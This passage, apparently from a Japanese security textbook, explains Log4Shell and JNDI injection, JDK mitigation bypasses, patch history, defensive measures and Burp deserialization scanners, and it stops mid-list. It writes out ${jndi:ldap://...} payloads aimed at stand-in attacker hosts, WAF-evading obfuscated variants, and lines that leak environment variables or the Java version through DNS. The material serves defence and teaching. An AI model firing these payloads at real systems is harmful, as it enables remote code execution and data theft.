> ⚠️ **未取得の資料**: 「HackTricks: JNDI & Log4Shell」は自動取得できませんでした（理由: リダイレクト先が HTTP 402 Payment Required を返し、ミラーも取得不可）。以下のURLからご自身で直接ご覧ください: https://hacktricks.wiki/en/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell.html
>
> （以下は未取得資料の補足として、Moritz Bechlerの記事と公開されているApache Log4jセキュリティ勧告に基づく一般知識の解説です。）

2016年のJNDIインジェクション研究は「lookupにユーザ入力を渡すアプリ」を前提にしていた。**Log4Shell（CVE-2021-44228）**が衝撃的だったのは、その「ユーザ入力からlookupへの経路」が、世界中のあらゆるJavaアプリに埋め込まれた**ロギングライブラリ Apache Log4j 2**の中に潜んでいたからだ。Moritz Bechlerの言葉を借りれば、問題の本質は単純である——「**Log4Jはログメッセージ中のプレースホルダを展開する際にJNDIの`lookup()`を実行する**」。

Log4j 2には**Lookup**という文字列展開機能があり、ログ出力に`${...}`という記法で動的な値を埋め込める。`${java:version}`や`${env:USER}`のように。問題は、この展開が**ログとして記録される文字列の本体に対しても行われる**点と、Lookupの一種に`jndi`が含まれていた点だ。したがって攻撃者は、アプリがログに書きそうな任意の場所（`User-Agent`ヘッダ、ユーザ名、検索クエリなど）に次のような文字列を仕込むだけでよい。

```
${jndi:ldap://attacker-server/a}
```

これがログ処理の中で展開されると、Log4jは`ldap://attacker-server/a`をJNDIで`lookup`する。以降は本節で説明してきた通り——攻撃者のLDAPサーバがReferenceを返し、Naming Managerがファクトリクラスを遠隔ロードし、`newInstance()`でコードが動く。認証も特別な権限も要らず、CVSSは満点の**10.0**。影響範囲は**Log4j 2.0-beta9 〜 2.14.1**という広大なものだった。

Log4jのLookupはネストや文字変換をサポートするため、単純な文字列マッチによる検知・遮断は容易に回避される。代表的な難読化バリアントを示す（防御側が「これらも同一の攻撃だ」と理解するために挙げる）。

```
${jndi:ldap://host/a}                                     基本形
${jndi:${lower:l}${lower:d}ap://host/a}                   lower Lookup で l/d/a/p を小文字化して組み立て
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://host/a}   :- のデフォルト値展開で1文字ずつ合成
${jndi:${env:FOO:-l}dap://host/a}                         env Lookup（未定義なら :- のデフォルト値）で文字を挿入
${jndi:dns://host/a}                                      dns スキームで到達確認（OOB検知）
${jndi:ldap://${env:USER}.host/a}                         env で盗んだ値をサブドメインに載せて外部送信
```

なぜ回避できるのか。`${lower:...}`や`${::-x}`（`:-`はデフォルト値演算子）といった変換Lookupは、**JNDI Lookupに渡す前段で文字列を組み立て直す**ため、`jndi`や`ldap`という語がリテラルとして現れない。WAFやログフィルタが固定文字列を弾いても、実行時に等価な文字列へ復元されてしまうのだ。

Log4Shellの修正は一度では終わらず、連鎖的に複数のCVEが発行された（対象バージョンと修正版は防御判断に直結するため明記する）。

| CVE | 概要 | 修正版 |
|---|---|---|
| CVE-2021-44228 | 本体。JNDI LookupによるRCE。対象 2.0-beta9〜2.14.1 | 2.15.0 |
| CVE-2021-45046 | 2.15.0の修正が不完全。非デフォルト構成（Thread Context Map値をPatternLayoutで出力等）でRCE/情報漏えい・DoS | 2.16.0（`message` LookupやJNDIを既定で無効化） |
| CVE-2021-45105 | 自己参照Lookupによる無限再帰でDoS（StackOverflow） | 2.17.0 |
| CVE-2021-44832 | JDBC Appender設定を攻撃者が操作できる場合のRCE（前提条件が重い） | 2.17.1 |

Bechlerが強調する結論はきわめて実務的だ——「**現行のJavaバージョンが救ってくれると当てにするな。Log4jを更新せよ（あるいはJNDI Lookupを取り除け）。展開機能を無効化せよ**」。なぜJDKのバージョンに頼るのが危険なのか。次項でそのからくりを説明する。

> 出典: Moritz Bechler, "PSA: Log4Shell and the current state of JNDI injection" — https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

---

### 「新しいJDKなら安全」が成り立たない理由 —— ローカルガジェット

Log4Shellが騒ぎになった当初、「JDKを新しくすればReferenceの遠隔クラスロードは無効化されているから安全」という言説が広まった。Bechlerの記事は、この楽観を明確に否定する。JDK側の緩和策の歴史を押さえておこう。

- **RMIの遠隔Codebase無効化**: JDK **8u121**（2016年）で`com.sun.jndi.rmi.object.trustURLCodebase`のデフォルトが`false`になり、RMI Reference経由の遠隔クラスロードが既定で塞がれた。
- **LDAPの遠隔Codebase無効化**: JDK **8u191**（2018年、CVE-2018-3149）で`com.sun.jndi.ldap.object.trustURLCodebase`のデフォルトが`false`になり、LDAP Reference経由の遠隔クラスロードも既定で塞がれた。

これらが効くと、攻撃者の「自前クラスファイルをHTTPで配ってロードさせる」王道は使えなくなる。しかしBechlerが指摘する通り、**8u191以降でもJNDIインジェクションは死んでいない**。残る経路は2つある。

1. **ローカルガジェットクラス**: 遠隔からクラスを持ち込めなくても、**被害者のクラスパスにすでに存在するクラス**をReferenceのファクトリとして指名できる。有名なのが**Apache XBeanの`org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding`**経由や、`org.apache.naming.factory.BeanFactory`のようなファクトリで、これらは属性で指定されたクラスをBeanとして生成し、セッタを呼ぶ過程で任意の`ELProcessor`評価やコマンド実行に持ち込めるものがある（WebSphere等のアプリサーバ固有ガジェットも報告されている）。ポイントは、**これらは「遠隔クラスロード」ではなく「ローカルに存在するクラスの悪用」なので`trustURLCodebase`のガードを一切通らない**ことだ。

2. **Javaデシリアライゼーション**: RMIもLDAPも、応答オブジェクトを**デシリアライズ**する経路を持つ。デシリアライズ自体は`trustURLCodebase`とは無関係に実行されるため、**グローバルなデシリアライズフィルタ（`jdk.serialFilter`／JEP 290）が設定されていなければ**、クラスパス上のガジェットチェーンでRCEに至る。前述のLDAP `javaSerializedData`ポイズニングは、まさにこの経路である。

だからBechlerは「Javaのバージョンに頼るな」と言う。JDKの緩和は**遠隔クラスロードという一経路を塞いだだけ**であって、ローカルガジェットとデシリアライズという二経路は残る。両者はクラスパス上に何のライブラリがあるか（＝アプリの依存関係）に左右されるため、**「うちのJDKは新しいから大丈夫」は誤り**なのだ。根本対策はJNDI Lookupという機能そのものを、信頼できない入力から到達不能にすることに尽きる。

> 出典: Moritz Bechler, "PSA: Log4Shell and the current state of JNDI injection" — https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

---

### 防御のまとめ

本節で見てきた原理から、防御の勘所を整理する。いずれも「攻撃を試す」ためではなく、自組織の資産を守るための設計・運用指針である。

- **信頼できない入力でJNDI lookupをしない**。これが唯一にして最大の原則。lookupの名前部分にユーザ入力が混じらないよう、コードとフレームワーク設定を監査する。
- **Log4jを最新の修正版（少なくとも2.17.1以降）へ更新する**。応急処置として`log4j2.formatMsgNoLookups=true`やJndiLookupクラスの除去があるが、CVE-2021-45046が示すように応急策には抜けがあるため、恒久対策はバージョン更新。
- **`trustURLCodebase`は必ずfalseのまま**にする（`com.sun.jndi.rmi.object.trustURLCodebase`／`com.sun.jndi.ldap.object.trustURLCodebase`）。ただしこれは遠隔クラスロードを塞ぐだけで、ローカルガジェット・デシリアライズ経路には無力である点を忘れない。
- **JEP 290のデシリアライズフィルタ（`jdk.serialFilter`）を設定**し、想定外のクラスのデシリアライズを拒否する。LDAP `javaSerializedData`ポイズニングやRMI/CORBAデシリアライズ経路への横断的な防御になる。
- **不要なプロトコルとリスナーを無効化**する。使わないRMI/IIOP/CORBAリスナーを露出させない。SecurityManagerを有効にする場合は**Policyファイルの権限を最小化**する（緩いPolicyはCORBA経路でかえって危険）。
- **クラスパスの依存を減らす**。ローカルガジェットは既存ライブラリを踏み台にするため、不要な依存（古いCommons Collections等）を排除するだけで攻撃面が縮む。
- **LDAP側の防御**として、エントリへの書き込みACLを最小化し（Java Schema属性の書き込みを制限）、LDAP通信をTLSで保護してMiTMによるレスポンス改ざんを防ぐ。

Log4Shellが世界規模の惨事になったのは、脆弱性そのものが新しかったからではなく、2016年に警告された古典的なJNDIインジェクションが、**誰もが使うロギングという「見えない配管」を通じて無数のアプリに再配布されていた**からだ。デシリアライゼーションとSSTIがRCEに合流する本書のテーマにおいて、JNDIは「文字列がオブジェクトに、オブジェクトがコードになる」最短経路として、今後も繰り返し姿を変えて現れるだろう。

## Log4Shellの解析と緩和

### 0. 何が起きたのか——1行のログが招いたリモートコード実行

2021年11月にAlibabaのセキュリティチームが発見し、同年12月10日に公開されたCVE-2021-44228（通称「Log4Shell」）は、Javaで最も広く使われているロギングフレームワークApache Log4j 2に存在した、深刻度が最大値（CVSS 10.0）のリモートコード実行（RCE: Remote Code Execution、攻撃者が任意のコードをサーバー上で実行できる状態）脆弱性です。影響範囲は、Log4j 2に依存するMavenパッケージだけで約7,000件にのぼると報告されており、Minecraft、iCloud、Steam、各種クラウド基盤製品など、業種を問わず世界中のJavaアプリケーションが影響を受けました。

本節では、「なぜユーザー入力を1行ログに出力しただけでRCEに至るのか」という核心のメカニズムを、JNDI（Java Naming and Directory Interface：Javaクライアントが名前を通じてリソースを検索するためのAPI）というJavaの機能仕様まで遡って解説し、実務で使える緩和策を整理します。

### 1. Log4jのLookup機能——「動的な値の埋め込み」という設計思想

Log4j 2には、ログメッセージやログ設定ファイルの中に `${...}` という記法で「動的に解決される値」を埋め込める **Lookup（ルックアップ）** という機能があります。たとえば環境変数を埋め込みたければ `${env:PATH}` 、システムプロパティなら `${sys:user.name}` のように書くと、ログ出力時にLog4jがその場で値を解決して展開します。

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

このLookup機構の実装は、`StrLookup` というインタフェースを実装した多数のクラス（`EnvironmentLookup`、`SystemPropertiesLookup`、`JndiLookup` など）が担っており、ログメッセージの文字列がパターン展開エンジンを通るたびに、`${プレフィックス:値}` という構文が見つかると対応する `StrLookup` 実装が呼び出されて実際の値に置換されます。この「サーバーが受け取った文字列の中身をそのまま構文として解釈し、対応する処理を呼び出す」という挙動こそが、後述するSSTI（Server-Side Template Injection）系の脆弱性群とも通底する本質的な危険パターンです。ログに出す文字列は「ただの表示用テキスト」ではなく、Log4jにとっては「評価対象のミニ言語」だった、という点が最初の理解のポイントです。

問題の中心にあるのが `JndiLookup` クラスです。これは `${jndi:...}` という接頭辞を見つけると、続く文字列をJNDI名としてJavaのJNDI APIに渡し、名前解決（ネームルックアップ）を実行します。

```
${jndi:ldap://attackers-domain.com/a}
${jndi:ldaps://attackers-domain.com/a}
${jndi:rmi://attackers-domain.com/a}
${jndi:dns://attackers-domain.com/a}
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

この4行は、Log4Shellの本質を凝縮したペイロード例です。攻撃者が制御できる何らかの文字列（HTTPリクエストのUser-Agentヘッダ、ログイン失敗時のユーザー名、X-Forwarded-Forヘッダなど、アプリケーションがログに書き出しうる値）にこの文字列を混入させ、それがログに書き込まれた瞬間に、Log4jが「これはJNDIルックアップの指示だ」と解釈して、攻撃者が指定したLDAPサーバーやRMIサーバーへ問い合わせを開始してしまいます。

### 2. 脆弱なコードパターン——なぜ「ただのログ出力」が引き金になるのか

Semgrepのブログでは、以下のような一見無害なログ出力コードが脆弱性の入り口になると説明されています。

```java
public void handle(HttpExchange he) throws IOException {
  String userInput = he.getRequestHeader("some-header");
  log.info("Request User Agent:" + userInput); // vulnerable
}
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

このコードの危険性は、`userInput`（攻撃者が完全にコントロールできる、つまり**sink**：入力が最終的に実行・解釈される危険な代入先、に到達する経路の**source**：攻撃者が制御できる入力の出発点、にあたるHTTPヘッダ値）がそのまま `log.info(...)` に渡っている点にあります。開発者から見ればこれは「アクセスログにUser-Agentを記録しているだけ」の平凡なコードですが、Log4j側からすると「ログに書き込む文字列の中に `${jndi:...}` が含まれていたら、それはルックアップ指示として実行する」という仕様が働いてしまいます。つまり脆弱性の本質は、**「ログという本来受動的であるべき記録先が、実は能動的に文字列を評価するインタプリタになっていた」** という、開発者の期待と実装の乖離にあります。これはテンプレートエンジンにユーザー入力をそのまま渡してしまうSSTI（本章の主題とも関連）と全く同じ形の設計ミスであり、「入力を評価するコンポーネントに、サニタイズなしで外部入力を渡す」というパターンが繰り返し重大な脆弱性を生むことを示す好例です。

### 3. JNDI経由のコード実行——「名前解決」がなぜ「コード実行」になるのか

ここが最も理解を要する部分です。「名前を検索する」だけのはずのJNDIが、なぜコード実行に直結するのでしょうか。

JNDIは、RMI（Remote Method Invocation）、CORBA、LDAP、DNSなど複数のディレクトリ・ネーミングサービスプロトコルを抽象化してJavaプログラムに提供するAPIです。

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

`JndiLookup` が `${jndi:ldap://attackers-domain.com/a}` を渡されると、内部的には `javax.naming.InitialContext#lookup()` に相当する処理を呼び出し、指定されたLDAP（Lightweight Directory Access Protocol：ディレクトリサービスに問い合わせるための軽量プロトコル）サーバーに対して名前解決を要求します。ここで攻撃者が用意した悪性LDAPサーバーは、正規のディレクトリエントリの代わりに、**リモート参照（Reference）オブジェクト** を返します。この参照オブジェクトには「このJavaオブジェクトを生成するファクトリクラスは、このURLにあるJARファイルの中にある」という情報（`javaCodeBase` と `javaFactory` 属性）が含まれています。

MOGWAI LABSの解析では、この挙動を支えるさらに重要な内部実装の詳細として、`Context.lookup()` メソッドが「絶対URLが与えられた場合に、プロトコルとアドレスを動的に切り替えることができる」点が指摘されています。

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

つまり、Log4j側が最初にLDAPプロトコルで問い合わせを始めても、悪性サーバーが返す参照オブジェクトの中で「実は別のプロトコル・別のアドレスから取得しろ」という指示を含めることができ、JNDIクライアント（Log4jを動かしているJVM）はその指示に従って切り替わってしまいます。この「サーバー側から見えている接続先を、応答の中身によって別の場所に転送させられる」という性質が、後述する各種の緩和策（JEPによるコードベース制限やLDAP専用の防御）を回避しようとする亜種攻撃が繰り返し登場した理由でもあります。

Java側がこの参照オブジェクトを受け取ると、指定されたコードベースURLから対応するJavaクラス（ファクトリクラス）をダウンロードし、それをインスタンス化します。攻撃者がこのファクトリクラスの中に任意のJavaコードを仕込んでおけば、インスタンス化と同時にそのコードが実行される、という流れです。これは実質的に「リモートのJavaクラスをその場でロードして実行する」機能であり、Javaのクラスロード機構そのものを悪用したコード実行経路になります。

### 4. 攻撃条件——「必ず刺さる」わけではない理由

MOGWAI LABSは、実際に任意コード実行まで到達するための前提条件を整理しています。

**外部へのネットワーク接続が必須:**
> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

攻撃が成立するためには、対象アプリケーションが攻撃者のインフラへ**アウトバウンド接続**できる必要があります。単にDNSクエリが飛ぶだけでは不十分で（脆弱性の**存在確認**には使えても）、実際にLDAP/RMIサーバーへの完全な接続性が必要です。これは防御側にとって重要な意味を持ちます——**アウトバウンド通信を厳格に制限（デフォルト拒否）しているネットワーク**では、脆弱なライブラリが存在してもRCEまでは到達しにくく、egress（外向き通信）制御が多層防御として有効に機能する、ということです。

**Javaバージョンによる既定の緩和:**
Java 8u121以降、および7u201以降では、`com.sun.jndi.ldap.object.trustURLCodebase`（および `rmi` 版）のデフォルトが `false` に変更されており、LDAP/RMI経由でのリモートクラスのロードがデフォルトで無効化されています。

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

つまり2021年時点で比較的新しいJavaランタイムを使っていれば、「リモートJARから任意クラスをロードする」という最も直接的な攻撃経路はすでに塞がれていました。しかし——ここが重要な点ですが——この緩和はあくまで「リモートのバイトコードを直接ロードする」経路を防いでいるだけであり、次に説明する**別の経路**は依然として有効でした。

### 5. 「パッチ済みJVM」でも刺さる経路——デシリアライズガジェットチェーンとの合流

MOGWAI LABSは、`trustURLCodebase` 対策済みの新しいJavaでも、確実にコード実行に至る経路が残っていたと指摘しています。

**信頼できるコード実行が可能なシナリオ:**
- ターゲットがApache Tomcatを使用している場合（`org.apache.naming.factory.BeanFactory` クラスを利用した経路）
- ターゲットがIBM WebSphereを使用している場合（WSDLの操作と一時JARの配置による経路）
- 攻撃者がネイティブなデシリアライズガジェットを利用する場合

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

これは、Log4Shellが単独の脆弱性ではなく、**JNDIを踏み台にして、対象JVMのクラスパス上にすでに存在する「危険なJavaクラス」を悪用する**、より一般的なJavaデシリアライゼーション攻撃の枠組みに合流する点が本質だという理解につながります。たとえばTomcatの `BeanFactory` は、JNDIから受け取った属性値をJavaBeanのプロパティとして設定できる汎用ファクトリであり、攻撃者は「リモートクラスをロードする」代わりに「対象のクラスパス上に既に存在するこの `BeanFactory` を、任意のプロパティ値とともに呼び出させる」ことで、`trustURLCodebase` の制限を経由せずにオブジェクト生成・プロパティ設定（ひいてはgetter/setter経由の副作用）を引き起こせます。これは本章のテーマである「デシリアライゼーションとガジェットチェーン」——攻撃者が新しいコードを注入するのではなく、**アプリケーションがすでに読み込んでいるクラス群（ガジェット）を、都合よく連鎖させて悪用する**——という考え方そのものです。JNDIインジェクションは「エントリポイント」であり、実際のRCEの多くは、その先につながるデシリアライズガジェットチェーンの巧拙によって成否が決まる、という構造を理解しておくことが重要です。

### 6. 影響を受けるバージョンと修正の経緯（2021年12月〜2022年）

Log4Shell関連の脆弱性は一つのCVEで完結しておらず、初期パッチの回避や関連する別の欠陥が短期間に連鎖して報告されました。年月・バージョンを正確に押さえておくことは、対応の陳腐化を避ける上で重要です。

- **Log4j 2.0-beta9 〜 2.14.1**: CVE-2021-44228（Log4Shell本体）の影響範囲。
- **修正版 2.15.0**（2021年12月10日リリース）: 初期修正。ただし特定の設定（非デフォルトのパターンレイアウトなど）下でDoSやRCEの余地が残ることが後に判明（CVE-2021-45046）。
- **修正版 2.16.0**: JNDIのメッセージルックアップ機能自体を無効化し、`log4j2.enableJndi` を明示的に有効化しない限りJNDI機能を使わせない、というより根本的な対応。
- **CVE-2021-45105**（DoS）および **CVE-2021-44832**（特定の構成下でのRCE）: 2021年12月中に追加で報告。
- **最終的な推奨バージョン 2.17.1 以降**: 上記すべてに対応済み。

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

このように「一度パッチを当てたから終わり」ではなく、短期間に複数回のバージョンアップが必要だった経緯自体が、Log4Shell対応の教訓の一つです。現在（本教科書執筆時点）で新規に対応する場合は、上記の中間バージョン（2.15.0や2.16.0）ではなく、必ず**2.17.1以降の最新安定版**、あるいは公式が案内する後継のLog4j 2.xの最新版を採用してください。

### 7. 緩和策——多層防御としての実務対応

原典2記事が共通して挙げている緩和策を、優先度順に整理します。

**① 最優先: バージョンアップ**

```
Java 8以降を使用している場合、Log4j 2.17.1以降へアップグレードする
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

Log4j 2.16.0以降ではメッセージルックアップ機能自体が既定で無効化されるため、根本的な対策になります。バージョンアップができない特殊なレガシー環境向けの緩和策が以下です。

**② 即時アップグレードできない場合の暫定策**

```
# システムプロパティで無効化
-Dlog4j2.formatMsgNoLookups=true

# または環境変数で無効化
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

これはLog4j 2.10以降で使用可能な設定で、メッセージ文字列に対する `${...}` 形式のルックアップ展開そのものを無効化します。ただし、この設定は「メッセージパターン」への対策であり、設定ファイル自体に含まれるルックアップ（コンテキストデータ、MDCなど別経路）までは網羅しない場合があったため、あくまで暫定策と位置づけられていた点に注意してください。

**③ ライブラリからの直接除去**

```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/、MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

両記事がまったく同じコマンドを緩和策として紹介しています。これは `log4j-core` のJARファイルから `JndiLookup` クラスそのものを物理的に削除するというアプローチで、「JNDIルックアップという機能自体をバイナリレベルで消してしまう」ため、アップグレードが困難な環境（コンテナイメージのベースが古い、依存関係の解決が複雑で差し替えが難しいなど）では有効な即効性のある対策として広く実施されました。ただし、これはあくまで応急処置であり、正式なバージョンアップに置き換えることが前提です。

**④ パターンレイアウトでの無効化**

```
%m{nolookups}
%msg{nolookups}
%message{nolookups}
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

ログ出力フォーマット（`log4j2.xml` などの設定ファイル）側で、メッセージ部分のルックアップ展開を無効にするパターン指定です。ただしこれも設定ファイル側の対応であり、コード側の対策（後述の静的解析）と組み合わせるべきものです。

**⑤ ネットワーク層での防御**

MOGWAI LABSの分析が示すとおり、攻撃成立にはアウトバウンド接続が必須です。したがって、アプリケーションサーバーからインターネットへの任意の外向き通信（特にLDAP:389/636、RMI関連ポート）をデフォルト拒否し、必要な宛先のみ許可するネットワークポリシー（アウトバウンドのアレイリスト化）は、未知の亜種や将来類似の脆弱性が出た場合にも効く汎用的な多層防御になります。

**⑥ 静的解析による検知**

```
semgrep --config s/chegg:log4j2_tainted_argument
```

> 出典: Semgrep — Understanding and mitigating Log4Shell — https://semgrep.dev/blog/2021/understanding-log4j-and-log4shell/

これは、攻撃者が制御しうる入力（source）が、サニタイズなしでLog4jのログ出力メソッド（sink）に到達している箇所を、コードベース全体からテイント解析（データフローを追跡し、危険な入力が危険な処理に届くかを検出する解析手法）で洗い出すルールです。「入力→ログ出力」という一見無害に見える経路を機械的に検出できる点が実務上有用で、パッチ適用後の再発防止（新規コードで再びユーザー入力を安易にログへ渡してしまう回帰）にも活用できます。

**⑦ 偵察・攻撃検知のためのシグネチャ**

```
${jndi:ldap://${java:version}.attacker-domain.com/a}
```

> 出典: MOGWAI LABS — Vulnerability notes Log4Shell — https://mogwailabs.de/en/blog/2021/12/vulnerability-notes-log4shell/

これは実際の攻撃観測でよく使われた「偵察用」ペイロードです。`${java:version}` というネストしたLookup（Lookupの中に別のLookupを埋め込める、Log4jの再帰的展開という仕様）を利用し、対象JVMのJavaバージョン文字列をDNSクエリのサブドメインとして攻撃者のドメインへ送出させます。攻撃者はこれを受信することで、対象がJava 8u191以前など「リモートクラスロードが可能な脆弱なバージョン」かどうかを、コード実行なしに判定できます。防御側にとっては、このような入れ子のLookup構文や `java:` プレフィックスを含むリクエスト（ヘッダ、パラメータ、User-Agentなど）自体をWAFやログ監視のシグネチャとして検出する価値があります。ただし、Base64エンコードや大文字小文字の混在、`${${::-j}${::-n}${::-d}${::-i}:...}` のような文字列連結による難読化バリアントが多数確認されているため、単純な `${jndi:` の文字列一致だけでは検知漏れが生じる点に注意が必要です。

### 8. まとめ——この事例から何を持ち帰るか

Log4Shellの本質は、「ログという受動的に見えるコンポーネントが、実は `${...}` という構文を評価するインタプリタだった」という**設計と期待のギャップ**にあります。そしてJNDIという「名前解決」の仕組みが、参照オブジェクトの応答内容次第でプロトコルも接続先も切り替えられる柔軟性を持っていたために、「名前を調べる」だけの操作が「リモートのコードをロードして実行する」操作に転化しました。さらに、Java本体のデフォルト設定強化（`trustURLCodebase=false`）という対策が講じられた後も、対象JVMのクラスパス上に存在する `BeanFactory` のようなガジェットクラスを経由することで、根本的にはデシリアライゼーション攻撃と同じ構造の脅威が残り続けた、という点は次節以降で扱うガジェットチェーン一般の理解にも直結します。

防御としては、単一の対策に頼らず、(1) バージョンアップによる恒久対策、(2) 設定・バイナリレベルでのJNDIルックアップの無効化、(3) アウトバウンド通信制御によるネットワーク層の多層防御、(4) 静的解析によるコードレベルでの回帰防止、という複数レイヤーを組み合わせることが、同種の「外部入力を評価系コンポーネントに直接渡してしまう」脆弱性クラス全般に対する実務上の王道です。

## Java検出ツール（Burp拡張群）

Javaのデシリアライゼーション脆弱性は、コード上の兆候（`ObjectInputStream#readObject`の呼び出し、クラスパス上に存在するガジェットライブラリ)から静的に「怪しい」と当たりを付けることはできても、実際に対象アプリが「危険な状態にある」ことを外部から確認するのは簡単ではありません。sink（入力が最終的に実行・解釈される危険な代入先。ここではガジェットチェーンの起点となる`readObject`など）にリーチできるか、対象のクラスパスにどのライブラリが載っているかは、ブラックボックス診断では基本的に見えないからです。本節では、この「見えないクラスパス」を可視化し、脆弱性の有無を機械的・半自動的に判定するための代表的なBurp Suite拡張3つを扱います。いずれも防御・診断目的のOSSツールであり、本節では「どう動いているか」「なぜその手法で検出できるのか」という原理の理解に重点を置きます。

### 前提: なぜブラックボックス検出が難しいのか

Javaのデシリアライゼーション攻撃（ガジェットチェーン攻撃）が成立するには、大きく3条件が揃う必要があります。

1. アプリケーションが信頼できない入力を`ObjectInputStream.readObject()`（あるいはそれをラップするXStream、Hessian、Kryoなど)に通していること
2. クラスパス上に、攻撃者が制御できるフィールド経由で任意コード実行に到達できる「ガジェットチェーン」を構成可能なライブラリ（Commons Collections、Spring、Hibernateなど）が存在すること
3. そのガジェットチェーンが対象のJava/ライブラリバージョンで実際に動作すること（メソッドシグネチャ変更やパッチで壊れていないか）

外部から観測できるのは基本的に「HTTPレスポンス」だけで、上記2と3はソースコードやJARを見なければ本来分かりません。そこで検出ツールは、次の3つの間接的なシグナルのいずれかを使って「見えないもの」を推測します。

- **タイミング（時間ベース）**: ガジェットチェーンの末端に`Thread.sleep()`相当の処理を仕込んだペイロードを送り、レスポンスが遅延すれば「そのチェーンが最後まで実行された」と推測する
- **帯域外通信（OOB／DNSベース）**: チェーンの末端でDNS名前解決を発生させるペイロードを送り、外部のDNSサーバ（Burp Collaboratorなど）に問い合わせが届けば「デシリアライズ処理がそこまで到達した」と確認する
- **CPU負荷（計算量ベース）**: ハッシュ衝突などを利用し、デシリアライズ処理自体に異常な計算コストを負わせて応答時間や可用性の変化を観測する（SerialDoS系）

これら3つの原理を理解した上で、各ツールの実装を見ていきます。

### Java Deserialization Scanner（federicodotta版）

> 出典: Java Deserialization Scanner (federicodotta) — https://github.com/federicodotta/Java-Deserialization-Scanner

Federico Dotta（HN Security）が開発したBurp拡張で、Javaデシリアライゼーション脆弱性の「検出」と「悪用」の両方を1つのツールに統合している点が特徴です。機能は大きく3つに分かれます。

#### 1. スキャナ統合（パッシブ／アクティブ）

Burpの標準スキャナに拡張がフックし、通過するすべてのHTTPトラフィックを対象に自動検査を行います。

- **パッシブ検出**: リクエスト/レスポンスのボディやパラメータに、Javaのシリアライズ形式に特有のシグネチャ（`AC ED 00 05`というマジックバイト列や、Base64エンコード時の`rO0AB`という先頭文字列など）が含まれていないかをシグネチャマッチで探します。これはペイロードを一切送らない「観測のみ」の検出であり、対象への副作用がありません。
  - なぜこれで分かるのか: Javaの標準直列化フォーマットは、ストリームの先頭に固定のマジックナンバー（`0xACED`）とバージョン番号（`0x0005`）を必ず書き込む仕様になっています（`java.io.ObjectStreamConstants`参照）。この2バイトの並びは通常のテキストやJSON・XMLには出現しないため、非常にノイズの少ない指標として使えます。
- **アクティブ検出**: パッシブ検出でシリアライズデータの「入口」らしき箇所が見つかった場合、そこに実際に複数のガジェットチェーンのペイロード（後述のysoserial系）を注入し、タイミング差やDNSコールバックの有無で反応を確認します。

#### 2. マニュアルテスター

「Manual testing」タブから、任意のリクエストの任意の位置（挿入ポイント）にペイロードを注入して試験できます。ここでのキモは検出方式の選択肢です。

- **同期スリープ（Sync sleep）ペイロード**: ガジェットチェーンの最終地点で`Thread.sleep(N)`を実行させ、レスポンス時間が`N`ミリ秒程度遅延するかを見ます。遅延が確認できれば、そのライブラリ・バージョンの組み合わせでガジェットチェーンが最後まで実行されたことになり、任意コード実行が可能と判断できます。
  - 注意点として、ネットワークジッタや対象の負荷状況によって誤検知（false positive/negative）が起こり得るため、複数回の測定や統計的な閾値判断が実務上重要です。
- **DNS解決ペイロード**: チェーンの終端で`InetAddress.getByName("<一意なサブドメイン>.burpcollaborator.net")`のようなDNSルックアップを発生させます。Burp Collaboratorがそのドメインへの問い合わせを受信すれば、ネットワーク越しに（タイミングに依存せず）確実に「コードが実行された」ことを検出できます。これはブラインドSSRFの検出手法と同じ発想で、外部から観測可能な副作用（DNSクエリ）を「トリガー」として使う点が本質です。
- **CPU検出（SerialDoS応用）**: HashMapやHashSetなど、`hashCode()`計算のコストが高くなるようなオブジェクトグラフを注入し、デシリアライズ処理そのものにCPU負荷をかけて応答の遅延や異常を観測します。これはガジェットチェーンによるRCEではなく「サービス拒否(DoS)」の検証であり、ツールも「URLDNSなど脆弱ライブラリに依存しない検出のみの場合、DoSの可能性は高いがRCE実現には追加の解析が必要」と位置づけています。
- **URLDNS**: これは特定のガジェットライブラリ（Commons Collectionsなど）に依存しない、Java標準ライブラリだけで構成できる特殊なチェーンです。`java.net.URL`オブジェクトを含む`HashMap`をシリアライズし、デシリアライズ時に`hashCode()`計算の一環でDNS解決が走ることを利用します。これにより「ライブラリの有無に関わらず、そもそもこのエンドポイントがJavaの生シリアライズデータをデシリアライズしているか」だけを、コード実行なしで確認できます。これは実運用上、最初に打つべき「安全な疎通確認」として重要です。

#### 3. エクスプロイター（ysoserial統合）

検出後の悪用フェーズとして、ツールは著名なガジェットチェーン生成ツール`ysoserial`を内部から呼び出し、コマンド実行ペイロードをその場で生成・送信できます。対応チェーンは13種類以上に及び、代表的なものとして次が挙げられます。

